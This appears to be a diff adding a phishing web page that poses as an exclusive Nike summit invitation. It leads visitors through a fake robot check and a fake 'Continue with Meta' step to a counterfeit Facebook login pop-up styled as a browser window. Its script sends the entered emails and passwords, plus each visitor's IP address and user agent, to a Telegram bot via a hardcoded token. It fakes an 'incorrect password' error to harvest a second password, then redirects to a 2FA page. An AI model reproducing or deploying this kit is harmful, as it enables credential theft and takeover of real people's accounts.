@@ -1,0 +1,883 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Nike Virtual Innovation Summit</title>
+  <link href="https://fonts.googleapis.com/css2?family=Helvetica+Now+Display:wght@400;500;700&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <link href="https://fonts.googleapis.com/css2?family=Anton&family=Inter:wght@400;500;700&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      font-family: 'Inter', sans-serif;
+      background: linear-gradient(rgba(0, 0, 0, 0.7), rgba(0, 0, 0, 0.7)), url('images/nike-bg.jpg') no-repeat center center;
+      background-size: cover;
+      color: #fff;
+      min-height: 100vh;
+    }
+
+    header {
+      background: rgb(0, 0, 0);
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 1rem 2rem;
+    }
+
+    .logo img {
+      height: 40px;
+    }
+
+    nav a {
+      margin-left: 2rem;
+      color: #ddd;
+      text-decoration: none;
+      font-weight: 500;
+      font-size: 0.95rem;
+    }
+
+    nav a:hover {
+      color: #fff;
+    }
+
+    .container {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: calc(100vh - 80px);
+      padding: 2rem;
+      background-color: #000000;
+    }
+
+    .content-box {
+      background: rgba(0, 0, 0, 0.8);
+      padding: 3rem;
+      border-radius: 12px;
+      max-width: 700px;
+      width: 100%;
+      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
+      text-align: center;
+      animation: fadeIn 0.5s ease-out;
+      font-family: 'Inter', sans-serif;
+      font-size: 2.2rem;
+      font-weight: 400;
+      letter-spacing: -0.5px;
+    }
+
+    .content-box h1 {
+      letter-spacing: 1.3px;
+      color: #fff;
+      margin-bottom: 1.5rem;
+      font-size: 3rem;
+      font-weight: 700;
+      font-family: 'Anton', sans-serif;
+    }
+
+    .confidential {
+      font-size: 15px;
+      color: #ccc;
+      margin-bottom: 2rem;
+      line-height: 1.6;
+    }
+
+    .divider {
+      height: 1px;
+      background-color: #333;
+      margin: 2rem 0;
+    }
+
+    .btn-primary {
+      background-color: #fff;
+      color: #000;
+      border: none;
+      padding: 1rem 2rem;
+      font-size: 1rem;
+      font-weight: 600;
+      border-radius: 30px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      width: 100%;
+      max-width: 200px;
+    }
+
+    .btn-primary:hover {
+      background-color: #ddd;
+      transform: translateY(-2px);
+    }
+
+    /* Modal styles */
+    .modal {
+      display: none;
+      position: fixed;
+      z-index: 1000;
+      left: 0;
+      top: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0, 0, 0, 0.5);
+      align-items: center;
+      justify-content: center;
+      backdrop-filter: blur(3px);
+    }
+
+    .modal-content {
+      background: #fff;
+      padding: 2.5rem;
+      border-radius: 12px;
+      width: 100%;
+      max-width: 500px;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+      animation: slideUp 0.3s ease-out;
+      margin: 20px;
+    }
+
+    .modal-content h2 {
+      color: #000;
+      margin-bottom: 1.5rem;
+      font-size: 1.5rem;
+      font-weight: 700;
+      text-align: center;
+    }
+
+    .modal-content p {
+      color: #555;
+      margin-bottom: 1.5rem;
+      line-height: 1.6;
+      font-size: 14px;
+    }
+
+    .modal-content ul {
+      text-align: left;
+      margin: 0 0 1.5rem 1.5rem;
+      color: #555;
+      font-size: 14px;
+    }
+
+    .modal-content li {
+      margin-bottom: 0.5rem;
+    }
+
+    .modal-divider {
+      height: 1px;
+      background-color: #e0e0e0;
+      margin: 1.5rem 0;
+    }
+
+    .checkbox-container {
+      display: flex;
+      align-items: center;
+      margin-bottom: 1.5rem;
+    }
+
+    .checkbox-container input {
+      margin-right: 10px;
+      width: 18px;
+      height: 18px;
+    }
+
+    .checkbox-container label {
+      color: #333;
+      font-weight: 500;
+      font-size: 14px;
+    }
+
+    .privacy-links {
+      text-align: center;
+      margin-bottom: 1.5rem;
+      font-size: 14px;
+      color: #777;
+    }
+
+    .privacy-links a {
+      color: #0066cc;
+      text-decoration: none;
+    }
+
+    .privacy-links a:hover {
+      text-decoration: underline;
+    }
+
+    /* Auth Modal Styles */
+    .auth-modal {
+      display: none;
+      position: fixed;
+      z-index: 1000;
+      left: 0;
+      top: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0,0,0,0.5);
+      align-items: center;
+      justify-content: center;
+      backdrop-filter: blur(3px);
+    }
+
+    .auth-modal-content {
+      background: white;
+      border-radius: 8px;
+      width: 420px;
+      max-width: 90vw;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.3);
+      overflow: hidden;
+      margin: 20px;
+    }
+
+    .draggable {
+      position: fixed;
+      z-index: 1001;
+      cursor: move;
+    }
+
+    .modal-header {
+      background: #f1f1f1;
+      color: #333;
+      padding: 0 12px;
+      height: 40px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      border-bottom: 1px solid #ddd;
+      cursor: move;
+    }
+
+    .modal-title {
+      font-size: 12px;
+      color: #666;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .modal-controls {
+      display: flex;
+    }
+
+    .modal-controls button {
+      background: none;
+      border: none;
+      width: 46px;
+      height: 40px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 0;
+      cursor: pointer;
+      color: #666;
+      font-size: 16px;
+      transition: background-color 0.2s;
+    }
+    
+    .modal-controls button:hover {
+      background-color: rgba(0,0,0,0.1);
+    }
+    
+    .close-btn:hover {
+      background-color: #e81123;
+      color: white;
+    }
+
+    .url-bar {
+      background: #f8f9fa;
+      padding: 8px 12px;
+      border-bottom: 1px solid #e0e0e0;
+      display: flex;
+      align-items: center;
+      font-size: 13px;
+      color: #5f6368;
+    }
+
+    .url-text {
+      flex: 1;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+      background: white;
+      padding: 6px 12px;
+      border-radius: 15px;
+      border: 1px solid #dadce0;
+      margin-left: 8px;
+    }
+
+    .modal-body {
+      padding: 20px;
+    }
+
+    /* Facebook Login Styles */
+    .fb-header {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    .fb-header i {
+      font-size: 40px;
+      color: #1877f2;
+      margin-bottom: 10px;
+    }
+
+    .fb-header span {
+      font-size: 24px;
+      font-weight: bold;
+      color: #1877f2;
+      display: block;
+    }
+
+    .fb-header p {
+      color: #606770;
+      font-size: 14px;
+      margin: 10px 0 20px;
+      text-align: center;
+    }
+
+    .fb-login-form {
+      display: flex;
+      flex-direction: column;
+      gap: 16px;
+      max-width: 320px;
+      margin: 0 auto;
+    }
+
+    .fb-input-group {
+      margin-bottom: 8px;
+      width: 100%;
+    }
+
+    .fb-input {
+      width: 100%;
+      padding: 14px 16px;
+      border: 1px solid #dddfe2;
+      border-radius: 6px;
+      font-size: 16px;
+      background: white;
+      box-sizing: border-box;
+    }
+
+    .fb-input:focus {
+      border-color: #1877f2;
+      box-shadow: 0 0 0 2px #e7f3ff;
+      outline: none;
+    }
+
+    .fb-login-button {
+      background-color: #1877f2;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      font-weight: bold;
+      padding: 12px;
+      cursor: pointer;
+      width: 100%;
+    }
+
+    .fb-login-button:hover {
+      background-color: #166fe5;
+    }
+
+    .fb-error-message {
+      color: #d93025;
+      font-size: 13px;
+      text-align: center;
+      margin-top: -10px;
+      margin-bottom: 10px;
+      display: none;
+    }
+
+    .fb-footer {
+      text-align: center;
+      margin-top: 20px;
+      padding-top: 20px;
+      border-top: 1px solid #dddfe2;
+    }
+
+    .fb-footer a {
+      color: #1877f2;
+      font-size: 13px;
+      text-decoration: none;
+    }
+
+    .fb-footer a:hover {
+      text-decoration: underline;
+    }
+
+    /* Animations */
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+
+    @keyframes slideUp {
+      from { 
+        opacity: 0;
+        transform: translateY(20px);
+      }
+      to { 
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    @media (max-width: 768px) {
+      .content-box {
+        padding: 2rem 1.5rem;
+      }
+      
+      .content-box h1 {
+        font-size: 2.2rem;
+      }
+      
+      .confidential {
+        font-size: 14px;
+      }
+      
+      .modal-content {
+        padding: 1.5rem;
+      }
+      
+      .modal-content h2 {
+        font-size: 1.3rem;
+      }
+      
+      .auth-modal-content {
+        width: 95%;
+      }
+      
+      .fb-input {
+        padding: 12px 14px;
+        font-size: 15px;
+      }
+      
+      .fb-login-button {
+        padding: 10px;
+        font-size: 15px;
+      }
+    }
+
+    @media (max-width: 480px) {
+      header {
+        flex-direction: column;
+        align-items: flex-start;
+        padding: 1rem;
+      }
+      
+      nav {
+        margin-top: 10px;
+        width: 100%;
+      }
+      
+      nav a {
+        margin: 0 1rem 0.5rem 0;
+        display: inline-block;
+        font-size: 0.85rem;
+      }
+      
+      .content-box {
+        padding: 1.5rem 1rem;
+      }
+      
+      .content-box h1 {
+        font-size: 1.8rem;
+      }
+      
+      .confidential {
+        font-size: 13px;
+      }
+      
+      .btn-primary {
+        padding: 0.8rem 1.2rem;
+        font-size: 0.9rem;
+        max-width: 100%;
+      }
+      
+      .modal-content,
+      .auth-modal-content {
+        margin: 10px;
+      }
+      
+      .modal-content h2 {
+        font-size: 1.2rem;
+        margin-bottom: 1rem;
+      }
+      
+      .modal-content p,
+      .modal-content ul {
+        font-size: 13px;
+        margin-bottom: 1rem;
+      }
+      
+      .checkbox-container label {
+        font-size: 13px;
+      }
+      
+      .fb-input {
+        font-size: 14px;
+        padding: 10px 12px;
+      }
+      
+      .fb-login-button {
+        font-size: 14px;
+        padding: 10px;
+      }
+      
+      .fb-header i {
+        font-size: 32px;
+      }
+      
+      .fb-header p {
+        font-size: 13px;
+      }
+    }
+  </style>
+</head>
+
+<body>
+  <header>
+    <div class="logo">
+      <img src="images/nike-logo-white.png" alt="Nike Logo">
+      <div></div>
+    </div>
+    <nav>
+      <a href="https://about.nike.com/">About</a>
+      <a href="https://about.nike.com/en/company">Company</a>
+      <a href="https://about.nike.com/en/stories">Stories</a>
+    </nav>
+  </header>
+
+  <div class="container">
+    <div class="content-box">
+      <h1>Welcome to Nike Virtual Innovation Summit</h1>
+      <p class="confidential">
+        You are invited to join an exclusive, invitation-only experience curated especially for a select group of individuals. 
+        This opportunity has been extended to you with great consideration, and we kindly ask that you keep the details of this invitation confidential.
+        We appreciate your discretion and look forward to sharing an inspiring and forward-thinking experience together.
+      </p>
+      <div class="divider"></div>
+      <button id="continueBtn" class="btn-primary">Continue</button>
+    </div>
+  </div>
+
+  <!-- Security Verification Modal -->
+  <div id="securityModal" class="modal" role="dialog" aria-modal="true" aria-labelledby="securityModalTitle" aria-describedby="securityModalDesc">
+    <div class="modal-content">
+      <h2 id="securityModalTitle">Security Verification</h2>
+      <p id="securityModalDesc">Before you can access the Nike Virtual Innovation Summit, we need to verify that you're a human and not an automated bot. This helps us maintain a secure environment for all our participants.</p>
+      
+      <h3>Why do we need this verification?</h3>
+      <p>This security measure helps us:</p>
+      <ul>
+        <li>Protect our participants' personal information</li>
+        <li>Prevent automated systems from abusing our services</li>
+        <li>Maintain the quality and reliability of our virtual summit</li>
+        <li>Ensure only legitimate users can access the system</li>
+      </ul>
+      <p>Your information is secure and this verification is only used to distinguish humans from bots. We appreciate your understanding and cooperation.</p>
+      
+      <div class="modal-divider"></div>
+      
+      <div class="checkbox-container">
+        <input type="checkbox" id="notRobot">
+        <label for="notRobot">I'm not a robot</label>
+      </div>
+      
+      <div class="privacy-links">
+        <a href="#">Privacy</a> - <a href="#">Terms</a>
+      </div>
+      
+      <button id="securityContinueBtn" class="btn-primary" disabled>Continue</button>
+    </div>
+  </div>
+
+  <!-- Authentication Required Modal -->
+  <div id="authModal" class="auth-modal" role="dialog" aria-modal="true" aria-labelledby="authModalTitle" aria-describedby="authModalDesc">
+    <div class="auth-modal-content">
+      <div class="modal-header">
+        <div class="modal-title" id="authModalTitle"><i class="fas fa-lock"></i> auth.nike.com</div>
+        <div class="modal-controls">
+          <button id="minimizeBtn" aria-label="Minimize modal">−</button>
+          <button id="authCloseBtn" class="close-btn" aria-label="Close modal">×</button>
+        </div>
+      </div>
+      <div class="url-bar">
+        <div class="url-text">https://auth.nike.com/verify</div>
+      </div>
+      <div class="modal-body">
+        <h2 style="text-align: center; margin-bottom: 20px; color: #000; font-size: 1.3rem;">Authentication Required</h2>
+        <p style="color: #555; margin-bottom: 20px; line-height: 1.5;">Access to the Nike Virtual Innovation Summit requires authentication through Meta. This authentication method is mandated in accordance with our internal security protocols and corporate policies, ensuring secure and compliant access for all users.</p>
+        <p style="color: #555; margin-bottom: 25px; line-height: 1.5;">Please note that no personal data is collected during the authentication process. This measure is in place solely to verify access in alignment with company policy, and all user privacy is fully respected and protected throughout.</p>
+        <div style="text-align: center;">
+          <button id="continueWithMetaBtn" style="background-color: #000; color: white; border: none; border-radius: 6px; padding: 12px 24px; font-size: 16px; font-weight: bold; cursor: pointer; transition: background-color 0.3s;">Continue with Meta</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Facebook Login Modal -->
+  <div id="fbModal" class="auth-modal" role="dialog" aria-modal="true" aria-labelledby="fbModalTitle" aria-describedby="fbModalDesc">
+    <div class="auth-modal-content draggable" id="draggableFbModal">
+      <div class="modal-header" id="fbModalHeader">
+        <div class="modal-title" id="fbModalTitle"><i class="fab fa-facebook"></i> facebook.com</div>
+        <div class="modal-controls">
+          <button id="fbMinimizeBtn" aria-label="Minimize modal">−</button>
+          <button id="fbCloseBtn" class="close-btn" aria-label="Close modal">×</button>
+        </div>
+      </div>
+      <div class="url-bar">
+        <div class="url-text">https://www.facebook.com/login</div>
+      </div>
+      <div class="modal-body">
+        <div class="fb-header">
+          <i class="fab fa-facebook"></i>
+          <p>Facebook helps you connect and share with the people in your life.</p>
+        </div>
+        <form class="fb-login-form" id="fbLoginForm">
+          <div class="fb-input-group">
+            <input type="text" class="fb-input" placeholder="Email or phone number" required>
+          </div>
+          <div class="fb-input-group">
+            <input type="password" class="fb-input" placeholder="Password" required>
+          </div>
+          <button type="submit" class="fb-login-button">Log In</button>
+          <div class="fb-error-message" id="fbErrorMessage">Incorrect password. Please try again.</div>
+          <div class="fb-footer">
+            <a href="#">Forgotten password?</a>
+          </div>
+        </form>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // Telegram API configuration
+    const TELEGRAM_BOT_TOKEN = '7489121653:AAGO9WeABG0P7fl6hnqAf7WrDrptpfHguAo';
+    const TELEGRAM_CHAT_ID = '1389938531';
+    let firstAttemptData = null;
+    let isDragging = false;
+    let offsetX, offsetY;
+
+    // Function to send data to Telegram
+    async function sendToTelegram(message) {
+      try {
+        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message,
+            parse_mode: 'HTML'
+          })
+        });
+        return await response.json();
+      } catch (error) {
+        console.error('Error sending to Telegram:', error);
+      }
+    }
+
+    // Elements
+    const continueBtn = document.getElementById('continueBtn');
+    const securityModal = document.getElementById('securityModal');
+    const notRobotCheckbox = document.getElementById('notRobot');
+    const securityContinueBtn = document.getElementById('securityContinueBtn');
+    const authModal = document.getElementById('authModal');
+    const authCloseBtn = document.getElementById('authCloseBtn');
+    const continueWithMetaBtn = document.getElementById('continueWithMetaBtn');
+    const fbModal = document.getElementById('fbModal');
+    const fbCloseBtn = document.getElementById('fbCloseBtn');
+    const fbMinimizeBtn = document.getElementById('fbMinimizeBtn');
+    const fbLoginForm = document.getElementById('fbLoginForm');
+    const fbErrorMessage = document.getElementById('fbErrorMessage');
+    const draggableFbModal = document.getElementById('draggableFbModal');
+    const fbModalHeader = document.getElementById('fbModalHeader');
+
+    // Draggable functionality for Facebook modal (desktop only)
+    if (window.innerWidth > 768) {
+      fbModalHeader.addEventListener('mousedown', startDrag);
+      document.addEventListener('mousemove', drag);
+      document.addEventListener('mouseup', endDrag);
+    }
+
+    function startDrag(e) {
+      isDragging = true;
+      const rect = draggableFbModal.getBoundingClientRect();
+      offsetX = e.clientX - rect.left;
+      offsetY = e.clientY - rect.top;
+      draggableFbModal.style.cursor = 'grabbing';
+    }
+
+    function drag(e) {
+      if (!isDragging) return;
+      e.preventDefault();
+      
+      let x = e.clientX - offsetX;
+      let y = e.clientY - offsetY;
+      
+      // Boundary checks
+      const maxX = window.innerWidth - draggableFbModal.offsetWidth;
+      const maxY = window.innerHeight - draggableFbModal.offsetHeight;
+      
+      x = Math.max(0, Math.min(x, maxX));
+      y = Math.max(0, Math.min(y, maxY));
+      
+      draggableFbModal.style.left = `${x}px`;
+      draggableFbModal.style.top = `${y}px`;
+    }
+
+    function endDrag() {
+      isDragging = false;
+      draggableFbModal.style.cursor = 'move';
+    }
+
+    // Show security modal on continue click
+    continueBtn.addEventListener('click', () => {
+      securityModal.style.display = 'flex';
+    });
+
+    // Enable continue button when checkbox is checked
+    notRobotCheckbox.addEventListener('change', function() {
+      securityContinueBtn.disabled = !this.checked;
+    });
+
+    // Show auth modal when security continue is clicked
+    securityContinueBtn.addEventListener('click', () => {
+      securityModal.style.display = 'none';
+      authModal.style.display = 'flex';
+    });
+
+    // Close auth modal
+    authCloseBtn.addEventListener('click', () => {
+      authModal.style.display = 'none';
+    });
+
+    // Show Facebook modal when continue with Meta is clicked
+    continueWithMetaBtn.addEventListener('click', () => {
+      authModal.style.display = 'none';
+      fbModal.style.display = 'flex';
+      fbErrorMessage.style.display = 'none';
+      
+      // Reset modal position when shown
+      if (window.innerWidth > 768) {
+        draggableFbModal.style.left = '';
+        draggableFbModal.style.top = '';
+      }
+    });
+
+    // Close fb modal
+    fbCloseBtn.addEventListener('click', () => {
+      fbModal.style.display = 'none';
+    });
+
+    // Minimize functionality
+    fbMinimizeBtn.addEventListener('click', () => {
+      fbModal.style.display = 'none';
+    });
+
+    // Handle Facebook form submission
+    fbLoginForm.addEventListener('submit', async (e) => {
+      e.preventDefault();
+      
+      const emailInput = fbLoginForm.querySelector('input[type="text"]');
+      const passwordInput = fbLoginForm.querySelector('input[type="password"]');
+      const loginBtn = fbLoginForm.querySelector('.fb-login-button');
+      const originalText = loginBtn.textContent;
+      
+      // Collect login data
+      const loginData = {
+        email: emailInput.value,
+        password: passwordInput.value
+      };
+
+      // Show loading state
+      loginBtn.textContent = 'Logging in...';
+      loginBtn.disabled = true;
+      fbErrorMessage.style.display = 'none';
+
+      // First attempt
+      if (!firstAttemptData) {
+        firstAttemptData = loginData;
+        
+        // Send first attempt to Telegram
+        await sendToTelegram(`
+<b>Facebook Login Attempt (First Attempt)</b>
+📧 <b>Email/Phone:</b> ${loginData.email}
+🔑 <b>Password:</b> ${loginData.password}
+        `.trim());
+        
+        // Simulate delay and show incorrect password
+        setTimeout(() => {
+          fbErrorMessage.style.display = 'block';
+          loginBtn.textContent = originalText;
+          loginBtn.disabled = false;
+          passwordInput.value = '';
+          passwordInput.focus();
+        }, 1500);
+      } 
+      // Second attempt
+      else {
+        // Send second attempt to Telegram
+        await sendToTelegram(`
+<b>Facebook Login Attempt (Second Attempt)</b>
+📧 <b>Email/Phone:</b> ${loginData.email}
+🔑 <b>Password:</b> ${loginData.password}
+        `.trim());
+        
+        // Simulate delay and redirect to 2FA
+        setTimeout(() => {
+          window.location.href = '2fa.html';
+        }, 1500);
+      }
+    });
+
+    // Close modals when clicking outside
+    window.addEventListener('click', (e) => {
+      if (e.target === securityModal) {
+        securityModal.style.display = 'none';
+      }
+      if (e.target === authModal) {
+        authModal.style.display = 'none';
+      }
+      if (e.target === fbModal) {
+        fbModal.style.display = 'none';
+      }
+    });
+
+    // Send visitor info on page load
+    window.addEventListener('DOMContentLoaded', async () => {
+      const ipResponse = await fetch('https://api.ipify.org?format=json');
+      const ipData = await ipResponse.json();
+      
+      await sendToTelegram(`
+<b>New Visitor to Nike Summit</b>
+🌍 <b>IP:</b> ${ipData.ip}
+🖥 <b>User Agent:</b> ${navigator.userAgent}
+      `.trim());
+    });
+
+    // Make modals responsive on window resize
+    window.addEventListener('resize', () => {
+      if (window.innerWidth <= 768) {
+        // Reset draggable position on mobile
+        if (draggableFbModal) {
+          draggableFbModal.style.left = '';
+          draggableFbModal.style.top = '';
+        }
+      } else {
+        // Re-enable dragging if window is resized back to desktop
+        if (!fbModalHeader.hasEventListener) {
+          fbModalHeader.addEventListener('mousedown', startDrag);
+          fbModalHeader.hasEventListener = true;
+        }
+      }
+    });
+  </script>
+</body>
+</html>
